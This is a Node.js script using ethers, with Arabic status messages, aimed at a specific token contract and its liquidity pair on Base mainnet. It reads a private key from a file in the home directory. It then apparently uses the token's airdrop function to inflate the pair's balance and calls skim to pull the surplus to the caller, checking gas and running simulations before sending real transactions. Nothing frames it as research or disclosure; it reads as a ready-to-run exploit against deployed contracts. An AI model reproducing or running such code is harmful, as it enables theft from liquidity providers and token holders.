import fs from "node:fs";
import { JsonRpcProvider, Wallet, formatUnits, formatEther } from "ethers";

const R = "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const G = 8000000n;
const F = { maxFeePerGas: G, maxPriorityFeePerGas: 1000000n };

const j = async (m, pr) => (await fetch(R, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };

async function main() {
  const p = new JsonRpcProvider(R, 8453, { staticNetwork: true });
  const me = new Wallet(fs.readFileSync(process.env.HOME + "/.pk", "utf8").trim(), p);
  const ME = me.address;

  const bal = await bn(T, "0x70a08231" + pad(ME));
  const eth = await p.getBalance(ME);
  const before = await bn(T, "0x70a08231" + pad(P));
  console.log("SLOP:", formatUnits(bal, 9), "| ETH:", formatEther(eth));

  const drop = "0x983bc41b" + w32(0x60) + pad(ME) + w32(bal) + w32(1) + pad(P);
  const skim = "0xbc25cf77" + pad(ME);

  const a = await j("eth_call", [{ from: ME, to: T, data: drop, gas: "0x20000" }, "latest"]);
  const b = await j("eth_call", [{ from: ME, to: P, data: skim, gas: "0x30000" }, "latest"]);
  console.log("محاكاة airdrop:", a.error ? "✗" : "✓", "| محاكاة skim:", b.error ? "✗" : "✓");
  if (a.error || b.error) return;
  if (eth < 220000n * G) { console.log("غاز ناقص"); return; }
  if (process.env.DRY === "1") { console.log("جاهز"); return; }

  console.log("\n1) دفع التوكنات إلى الحوض عبر airdrop...");
  let r = await (await me.sendTransaction({ to: T, data: drop, ...F, gasLimit: 80000n })).wait();
  console.log("  status:", r.status);

  const after = await bn(T, "0x70a08231" + pad(P));
  const gained = after - before;
  console.log("  الحوض استلم:", formatUnits(gained, 9), "| الفائض:", formatUnits(after - (await (async () => {
    const rv = (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;
    return BigInt("0x" + rv.slice(66, 130));
  })()), 9));

  if (gained === 0n) { console.log("  لم يصل شيء — توقف"); return; }

  await new Promise(x => setTimeout(x, 3000));
  console.log("2) skim...");
  r = await (await me.sendTransaction({ to: P, data: skim, ...F, gasLimit: 130000n })).wait();
  console.log("  status:", r.status);

  console.log("\nانتهى | SLOP:", formatUnits(await bn(T, "0x70a08231" + pad(ME)), 9), "| ETH:", formatEther(await p.getBalance(ME)));
}
main().catch(e => { console.error(e.shortMessage || e.message); process.exit(1); });
